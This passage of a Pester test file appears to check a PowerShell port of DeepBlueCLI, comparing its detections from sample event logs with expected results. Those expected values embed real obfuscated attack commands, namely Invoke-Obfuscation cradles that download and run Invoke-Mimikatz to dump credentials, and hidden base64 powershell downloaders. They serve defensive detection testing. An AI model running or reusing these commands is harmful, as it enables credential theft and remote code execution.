QBhADUAYwBmAGUANABhAGUAOABkAGYAMAA4AGYAMgA5AGQANAA2AGUANQA4ADcANgAzADgAYwBlADcAYwBkADEANwBhADAAMwAwAGEANQAxAGMAOQA1ADIAZgBmAGYANgA2ADYAZgA0ADAAOQA='|CONveRTTO-secUResTRING  -KEy  196,47,72,214,193,53,146,52,139,252,69,219,170,135,151,62,90,5,213,36,116,154,71,183) ) ))| .( $VErBosePRefERencE.toStrING()[1,3]+'x'-JOiN'')
'@
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
    }
    Context 'Powershell-Invoke-Obfuscation-many' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'Powershell-Invoke-Obfuscation-many.evtx')).FullName)
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Decoded') } | Select-Object -Expand Name
            $ar = @(
            [PSCustomObject]@{
                Date=[datetime]636397243483602897 # 2017-08-30 21:12:28Z
                Log='Powershell'
                EventID=[int]4104
                Message='Suspicious Command Line'
                Results="Long Command Line: greater than 1000 bytes`n500+ consecutive Base64 characters`n"
                Command=@'
 iNVOkE-expRessION (( [RUNTiMe.inTEROPsErVices.MARsHaL]::ptrTOsTRINgautO( [runTIME.IntErOPsERvIceS.MarSHAL]::SEcureSTRIngtObsTr($('76492d1116743f0423413b16050a5345MgB8AFEAcwB0AHAAaAAwAGEAWABRAG8AcgBMAEMAdAAyAFgANwAyAGsATABCAFEAPQA9AHwAZQBjADMAOAAxAGYAOAA4ADcANAA2ADIAYQAzADgANwBjADIANgAyAGYAYQA0ADYAYgBhADAANgBmADkAZgA4AGYAZQBiADQANgBlADAAYwAxADYAYwBmADIAZABhADEAMgA5ADQANwA0ADEAMAA1ADAAYQA1ADQAMwBmADAAMAAyAGEAYgBiADMAMQBhADgAMgBjADUAYQBkADcAMwBlADAAMQA4ADAANABiADEAYwA2AGQAOQAwADMAMgA0ADYAMgA5ADcAZgAwAGMAMwBkADUANABiAGYAOAAwADEAMQBmAGIAYQBhADAAOABiADIANwAxADQAMgAxADUANgAxADQAZgBlAGYAOQBiADQAMwAwADEAMAA3ADQAZQA3AGMAYgBkADQANQBlADAANwBkADYAYQBhADMAYwA1AGUAZQBhAGUANAAzADEANgBlAGQAOQA4ADcAMQAyADYAOABlADEAMgAxADkAYQBmADgANwBkAGIAOQBhADMAYgAzAGQAZAA1AGMANAA4ADcAZgBhAGYAYQBhAGUAZQBmAGIAOAA2ADAAMAAwADkAYgAwAGEAZgA1AGEAYwBmADUANgBjAGIAMQA5ADIAYQBmADYAYwAzADAAYwBlADYAYwA3AGIANQAxAGEAMQBlADMANwBjADYAMgBmAGQAZAAxADUAMAA0ADcAMQBiAGMAOQBkAGQAOAA5ADYAMwAwAGEAOQBjAGUANQAzADQANwA2ADkAZgAyAGYAOQA2ADgANgA2ADEAMQAxADkAYwBkADYAZQA2AGQAZABlAGEANgBlAGMAYwA0ADYANwBjAGMAYQAyADAAMQBmADUAZgA4ADUANAA4ADMANwA2AGYAOAAxADIAYQBhAGUAYgBjADMAYQAwADYAOQA5AGMAZQBjADkAOQAzADkAMQA0ADIANAAyAGEAZgAwAGUAYwA2ADIANwBlAGUANwBmADQANwBmADgAMgA2ADkANQAxAGMAMwBmAGQAMQA5ADMANwAzAGEAOAA0AGQANAA2AGIAZAA3ADQAYgAwAGIAMQAwADIAZgBkADMAYQBmADEAYgBiADkAYgAzADYAMQA5ADQANQA2ADQAMQA1ADcAMwA2ADYAMQA0ADAAMABlAGQANAAyADQAYQA2ADYAMwA0AGMAZQBiAGUAZQBkADUAYgAxADkANwBlAGMANgA1ADkANQAyADcAYQBmADYAYQA0ADYAMQBmAGUAOABkADEAOAAwAGMAMwBkAGUAYgBlAGEAMAAzADIAYgA1ADYAYQA5AGEAMABjADYAZAAwADQANABiAGYAZABjADMANwA0ADgAYwA1ADMAZQBjAGQAMQA4ADAAMQAwAGIAYQBhAGEAMAA1AGUAZgAyAGUAZABlAGMAMwA5ADkAMQAyADAAZgBjADgANwAyAGEANwA3ADcAOQA2AGUAZQBjADkAYwAwADIANQBjAGIAOAA2AGQAOQBkAGQAMQBjAGUANABlAGUAMABjADcAMQA3ADkANQAzAGQAOQA3AGUAYgBjAGEANgBmADMANwAxADYAMwBiAGMAYgA5ADQANQAxADQANAAxAGQAMABiADIAMQA0ADEAMQA3ADUAMAA4AGEAMAA4ADUAOABlADcAOABlADYANQA2ADQAZQAwADcANAA3ADYANQA5ADYAYQA5ADcANgAyADgANwAyADIAMwAyADEAZgA1ADkAYgBkADUANgA0AGEAMgBlAGEAYwBiADUAZQAwAGEANQAxAGEAOQAwADMANQA2ADYAMQBiAGMAYQA2ADgAMQA3ADAAOQBjADgAMwA5AGQAOQBhADUANgA1ADIAMABlADMAMgBiAGIAMwA4ADMAZAA5ADQAYwAxAGUANgBlADcANQBmAGIAOQAzADAANAAwAGMAZAA1AGQAYwA5AGEAMgA2ADcAMABjADcAOABhADQANgBiAGUAYQA4ADUAMgA='|CoNverTTo-secuReStriNG -k  82,189,200,92,184,235,46,38,211,250,202,240,198,208,70,100,210,121,211,227,2,148,77,154,149,200,93,130,24,30,119,255) ) )) ) 
'@
            }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
    }
    Context 'Powershell-Invoke-Obfuscation-string-menu' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'Powershell-Invoke-Obfuscation-string-menu.evtx')).FullName -AddPowerShellInfoEvents)
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Decoded') } | Select-Object -Expand Name
            $ar =@(
            [PSCustomObject]@{
                Date=[datetime]636397251486470095 # 2017-08-30 21:25:48Z
                Log='Powershell'
                EventID=[int]4104
                Message='Suspicious Command Line'
                Results="Possible command obfuscation: only 51% alphanumeric and common symbols`nUse of PowerSploit`n"
                Command=@'
  & ( $psHOmE[21]+$PSHome[30]+'x') ( (('IE'+'X '+'(Ne'+'w-Obje'+'c'+'t Ne'+'t.We'+'bCli'+'ent'+').Dow'+'n'+'loadSt'+'ri'+'ng({0}https://raw.'+'github'+'userc'+'o'+'nt'+'ent.'+'com/'+'ma'+'ttif'+'e'+'stati'+'on/'+'PowerSploit'+'/m'+'aster'+'/E'+'xfi'+'ltr'+'at'+'i'+'on/Invoke-M'+'im'+'ikatz'+'.ps1'+'{0});'+' '+'Invok'+'e-'+'M'+'imi'+'katz '+'-DumpCreds')  -f [cHaR]39)) 
'@
            },
            [PSCustomObject]@{
                Date=[datetime]636397251486317900 # 2017-08-30 21:25:48Z
                Log='Powershell'
                EventID=[int]4104
                Message='Suspicious Command Line'
                Results="Possible command obfuscation: only 53% alphanumeric and common symbols`n"
                Command=@'
$l7i= " ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+'1sp.'+'ztaki'+'mi'+'M-ekovnI/no'+'i'+'ta'+'rtl'+'ifx'+'E/'+'retsa'+'m/'+'tiolpSrewoP'+'/no'+'itats'+'e'+'fitt'+'am'+'/moc'+'.tne'+'tn'+'o'+'cresu'+'buhtig'+'.war//:sptth}0{(gn'+'ir'+'tSdaol'+'n'+'woD.)'+'tne'+'ilCb'+'eW.t'+'eN t'+'c'+'ejbO-w'+'eN('+' X'+'EI'(( ( )'x'+]03[emoHSP$+]12[EmOHsp$ ( &  ";  ( cHiLDiTEm  ("vAr"+"iaBlE"+":"+"l7I")).vaLuE[-1 ..-(( cHiLDiTEm  ("vAr"+"iaBlE"+":"+"l7I")).vaLuE.lengTh)]-JOIN''|& ( ([StRiNg]$VERbOsePREferENCe)[1,3]+'X'-join'')
'@
            },
            [PSCustomObject]@{
                Date=[datetime]636397251207837646 # 2017-08-30 21:25:20Z
                Log='Powershell'
                EventID=[int]4104
                Message='Suspicious Command Line'
                Results="Possible command obfuscation: only 49% alphanumeric and common symbols`n"
                Command=@'
 ((("{41}{32}{44}{45}{20}{36}{35}{21}{10}{40}{29}{42}{26}{28}{1}{19}{15}{11}{48}{49}{39}{30}{4}{18}{47}{31}{24}{23}{33}{43}{12}{13}{7}{8}{22}{46}{14}{27}{25}{5}{0}{34}{6}{16}{17}{38}{3}{9}{2}{37}" -f'1','ubuserco','Dump','tz ','festati','atz.ps','); In','s','t','-','p','m/','/','ma','ion/I','co','vok','e-M','on','ntent.','load','t','er','l','p','e-Mimik','.','nvok','gith',':','ti','rS',' (New-','o','{0}','t','String({0}h','Creds','imika','t','s','IEX','//raw','it','Object Net.WebCli','ent).Down','/Exfiltrat','/Powe','m','a')) -F  [ChaR]39) | . ( $ShelliD[1]+$sHELliD[13]+'X')
'@
            },
            [PSCustomObject]@{
                Date=[datetime]636397251041743494 # 2017-08-30 21:25:04Z
                Log='Powershell'
                EventID=[int]4104
                Message='Suspicious Command Line'
                Results="Possible command obfuscation: only 61% alphanumeric and common symbols`n"
                Command=@'
(('IEX ('+'New'+'-Object'+' Net.Web'+'Client'+')'+'.DownloadString(oH'+'4http'+'s:'+'//raw'+'.g'+'it'+'hubuse'+'rcontent.c'+'om/m'+'at'+'tifes'+'t'+'a'+'tion/'+'Po'+'we'+'rSploit/ma'+'s'+'ter/Exfiltra'+'tion'+'/I'+'nvoke-Mimikat'+'z.ps1oH4'+'); Invoke-Mimi'+'katz -Du'+'mpCred'+'s') -REpLacE ([cHaR]111+[cHaR]72+[cHaR]52),[cHaR]39)| IEx
'@
            }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                # if ($p -eq 'Results') {
                #    Write-Verbose -Message "$($ar[$i].$p.ToString() | Format-Hex)" -Verbose
                #    Write-Verbose -Message "$($o.$p | Format-Hex)" -Verbose
                # }
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
    }
    Context 'powersploit-security' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'powersploit-security.evtx')).FullName)
            # $r contains malicious content detected as TrojanDownloader:PowerShell/Agent.ABM!MTB
            # https://go.microsoft.com/fwlink/?linkid=37020&name=TrojanDownloader:PowerShell/Agent.ABM!MTB&threatid=2147744050&enterprise=0
            # Skip 'Decoded' property because
            <#
            This script contains malicious content and has been blocked by your antivirus software.
            at Invoke-Blocks, C:\Program Files\WindowsPowerShell\Modules\Pester\4.10.1\Functions\SetupTeardown.ps1: line 135
            at Invoke-TestGroupSetupBlocks, C:\Program Files\WindowsPowerShell\Modules\Pester\4.10.1\Functions\SetupTeardown.ps1: line 121
            #>
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Decoded') } | Select-Object -Expand Name
            $ar =@(
                [PSCustomObject]@{
                    Date=[datetime]636100031669033203 # 2016-09-20 21:19:26Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Long Command Line: greater than 1000 bytes`n500+ consecutive Base64 characters`nBase64 encoded and hidden PowerShell command`nBase64-encoded function`nDownload via Net.WebClient DownloadString`nUser-Agent set via command line`n"
                    Command=@'
powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUAdwAtAE8AQgBKAEUAQwBUACAAUwB5AFMAdABFAG0ALgBOAEUAVAAuAFcAZQBCAEMAbABJAGUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAGEAZABFAHIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AWABZACAAPQAgAFsAUwBZAFMAVABFAG0ALgBOAGUAdAAuAFcAZQBiAFIARQBxAHUAZQBzAHQAXQA6ADoARABFAGYAQQB1AGwAdABXAGUAYgBQAFIATwBYAHkAOwAkAHcAQwAuAFAAcgBvAFgAeQAuAEMAcgBlAGQARQBOAFQASQBBAEwAUwAgAD0AIABbAFMAWQBzAFQAZQBNAC4ATgBlAFQALgBDAFIAZQBEAGUAbgB0AGkAQQBMAEMAQQBjAGgAZQBdADoAOgBEAGUARgBBAFUAbAB0AE4AZQB0AHcAbwByAEsAQwBSAEUAZABlAG4AVABJAGEAbABTADsAJABLAD0AJwApADAAZABoAEMAeQAxAEoAOQBzADMAcQBZAEAAJQBMACEANwBwAHUAXQBUAHwAdgBWAH0AdABuAFsAQQBRAFIAJwA7ACQAaQA9ADAAOwBbAEMASABBAHIAWwBdAF0AJABCAD0AKABbAGMASABhAHIAWwBdAF0AKAAkAFcAYwAuAEQAbwB3AG4ATABvAGEARABTAHQAUgBpAG4ARwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA5ADgALgAxADQAOQA6ADgAMAA4ADIALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAGIAWABPAHIAJABLAFsAJABJACsAKwAlACQASwAuAEwARQBuAEcAdABoAF0AfQA7AEkARQBYACAAKAAkAEIALQBqAG8AaQBOACcAJwApAA==
'@
                },
                [PSCustomObject]@{
                    Date=[datetime]636100029541289062 # 2016-09-20 21:15:54Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Long Command Line: greater than 1000 bytes`n500+ consecutive Base64 characters`nBase64 encoded and hidden PowerShell command`nBase64-encoded function`nDownload via Net.WebClient DownloadString`nUser-Agent set via command line`n"
                    Command=@'
powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AUwBFAHIAdgBJAEMAZQBQAG8AaQBOAFQATQBBAE4AYQBHAEUAcgBdADoAOgBFAFgAUABlAEMAVAAxADAAMABDAG8AbgBUAGkAbgB1AEUAIAA9ACAAMAA7ACQAVwBjAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAWQBTAHQAZQBNAC4ATgBFAFQALgBXAGUAQgBDAGwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBBAEQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAHgAeQAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBXAEUAQgBSAGUAcQB1AEUAUwB0AF0AOgA6AEQAZQBmAGEAdQBMAFQAVwBlAEIAUABSAG8AeAB5ADsAJABXAGMALgBQAFIATwB4AFkALgBDAFIARQBEAGUATgBUAEkAYQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUAbQAuAE4AZQB0AC4AQwByAGUARABlAG4AdABJAEEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQBVAEwAVABOAGUAVAB3AG8AcgBrAEMAcgBFAEQAZQBuAFQASQBhAEwAcwA7ACQASwA9ACcAcwB5AHwAUgA0AFgAaABCAFcAbwB6AEsALgB4AC0ANgArADkAPgBJAGkAcQA3AEQAOABgAEoATABuAGwAdwBWACcAOwAkAEkAPQAwADsAWwBDAEgAYQBSAFsAXQBdACQAQgA9ACgAWwBDAGgAQQBSAFsAXQBdACgAJAB3AGMALgBEAE8AdwBuAGwAbwBhAEQAUwBUAHIASQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQA0ADkAOgA4ADAAOAAwAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgATwBSACQAawBbACQAaQArACsAJQAkAGsALgBMAGUAbgBnAHQAaABdAH0AOwBJAEUAWAAgACgAJABCAC0ASgBPAEkATgAnACcAKQA=
'@
                },
                [PSCustomObject]@{
                    Date=[datetime]636100029541289062 # 2016-09-20 21:15:54Z
                    Log='Security'
                    EventID=[int]1102
                    Message='Audit Log Clear'
                    Results='The Audit log was cleared by IE10WIN7\IEUser'
                    Command=''
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
        $i = 0
        $r[0..($r.Count -2)] | ForEach-Object {
            $o = $_
            It "Test result $($i) Command" {
                $o.Command -match 'powershell\.exe'| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match 'New-Object'| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match 'SyStEm\.NET\.WeBClIeNt'| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match 'https?://'| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match 'iex'| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match '\[[cC][hH][aA][rR]\['| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match '\.DOwnloaDSTrING\('| Should -Be $true
            }
            It "Test result $($i) Decoded" {
                $o.Decoded -match '-[bB]?[x|X][oO][rR]'| Should -Be $true
            }
            $i++
        }
    }
    Context 'powersploit-system' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'powersploit-system.evtx')).FullName)
            # The content of $r can be dumped to a file and it's not detected by AV
            # But if the content of $r is stored in this Pester file, there's the following error message
            # Skip 'Command' property because
            <#
            This script contains malicious content and has been blocked by your antivirus software.
            at Invoke-Blocks, C:\Program Files\WindowsPowerShell\Modules\Pester\4.10.1\Functions\SetupTeardown.ps1: line 135
            at Invoke-TestGroupSetupBlocks, C:\Program Files\WindowsPowerShell\Modules\Pester\4.10.1\Functions\SetupTeardown.ps1: line 121
            #>
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
            $ar = @(
                [PSCustomObject]@{
                    Date=[datetime]636100011485019531 # 2016-09-20 20:45:48Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Download via Net.WebClient DownloadString`nCommand referencing Mimikatz`n"
                },
                # Defender detects Invoke-M`imikatz, we just need to esapce it with `
                [PSCustomObject]@{
                    Date=[datetime]636100011244082031 # 2016-09-20 20:45:24Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Download via Net.WebClient DownloadString`nCommand referencing Mimikatz`nPowerSploit Invoke-M`imikatz.ps1`nUse of PowerSploit`n"
                },
                [PSCustomObject]@{
                    Date=[datetime]636100011244082031 # 2016-09-20 20:45:24Z
                    Log='Security'
                    EventID=[int]1102
                    Message='Audit Log Clear'
                    Results="The Audit log was cleared by IE10WIN7\IEUser"
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
        $i = 0
        $r[0..($r.Count - 2)] | ForEach-Object {
            $o = $_
            It "Test result $($i) Command" {
                $o.Command -match 'powershell\.exe'| Should -Be $true
            }
            It "Test result $($i) Command" {
                $o.Command -match "IEX\s\(New-Object\sNet\.WebClient\)\.DownloadString\('http"| Should -Be $true
            }
            It "Test result $($i) Command" {
                $o.Command -match 'Mimikatz'| Should -Be $true
            }
            $i++
        }
    }
    Context 'psattack-security' {
        BeforeAll {
            $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
            $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'psattack-security.evtx')).FullName)
            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Decoded') } | Select-Object -Expand Name
            $ar = @(
                [PSCustomObject]@{
                    Date=[datetime]636100008870644531 # 2016-09-20 20:41:27Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Resource File To COFF Object Conversion Utility cvtres.exe`nPSAttack-style command via cvtres.exe`n"
                    Command='C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RES3874.tmp" "c:\Users\IEUser\AppData\Local\Temp\CSC14C61BA389694F5FAB6FBD8E9CFA7CEF.TMP"'
                },
                [PSCustomObject]@{
                    Date=[datetime]636100008870175781 # 2016-09-20 20:41:27Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Use of C Sharp compiler csc.exe`nPSAttack-style command via csc.exe`n"
                    Command='"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\kwos13rh.cmdline"'
                },
                [PSCustomObject]@{
                    Date=[datetime]636100003939863281 # 2016-09-20 20:33:13Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Resource File To COFF Object Conversion Utility cvtres.exe`nPSAttack-style command via cvtres.exe`n"
                    Command='C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESB25D.tmp" "c:\Users\IEUser\AppData\Local\Temp\CSCAE981B6C775D478784A2D2A90379D51.TMP"'
                },
                [PSCustomObject]@{
                    Date=[datetime]636100003939238281 # 2016-09-20 20:33:13Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Use of C Sharp compiler csc.exe`nPSAttack-style command via csc.exe`n"
                    Command='"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\0xqpayvt.cmdline"'
                },
                [PSCustomObject]@{
                    Date=[datetime]636100001382988281 # 2016-09-20 20:28:58Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Resource File To COFF Object Conversion Utility cvtres.exe`nPSAttack-style command via cvtres.exe`n"
                    Command='C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESCB96.tmp" "c:\Users\IEUser\AppData\Local\Temp\CSCDD7CF7985DD64D48B389AD7A587C926D.TMP"'
                },
                [PSCustomObject]@{
                    Date=[datetime]636100001382675781 # 2016-09-20 20:28:58Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Use of C Sharp compiler csc.exe`nPSAttack-style command via csc.exe`n"
                    Command='"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\wlqywrdm.cmdline"'
                },
                [PSCustomObject]@{
                    Date=[datetime]636100000651152343 # 2016-09-20 20:27:45Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Resource File To COFF Object Conversion Utility cvtres.exe`nPSAttack-style command via cvtres.exe`n"
                    Command='C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESADB2.tmp" "c:\Users\IEUser\AppData\Local\Temp\CSC4EC78419D61349E285CD9DBCB3C7409.TMP"'
                },
                [PSCustomObject]@{
                    Date=[datetime]636100000649433593 # 2016-09-20 20:27:44Z
                    Log='Security'
                    EventID=[int]4688
                    Message='Suspicious Command Line'
                    Results="Use of C Sharp compiler csc.exe`nPSAttack-style command via csc.exe`n"
                    Command='"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\g4g34pot.cmdline"'
                },
                [PSCustomObject]@{
                    Date=[datetime]636100000649433593 # 2016-09-20 20:27:44Z
                    Log='Security'
                    EventID=[int]1102
                    Message='Audit Log Clear'
                    Results="The Audit log was cleared by IE10WIN7\IEUser"
                    Command=''
                }
            )
        }
        $i=0
        $r | ForEach-Object {
            $o = $_
            $props |
            ForEach-Object {
                $p = $_
                if ($p -eq 'Date') {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o.Date.ToUniversalTime()) -DifferenceObject ($ar[$i].Date) -Property $p)| Should -Be $true
                 }

                } else {
                 It "Test result $($i) $($p)" {
                    $null -eq (Compare-Object -ReferenceObject ($o) -DifferenceObject ($ar[$i]) -Property $p)| Should -Be $true
                 }
                }
            }
            $i++
        }
    }
    # smb-password-guessing-security.evtx
    # Context 'smb-password-guessing-security' {
    #     BeforeAll {
    #         $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
    #         $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'smb-password-guessing-security.evtx')).FullName)
    #         $props = $r[0].PSObject.Properties | Select-Object -Expand Name
    #     }
    # }
}
#endregion

} #endof inmodulescope
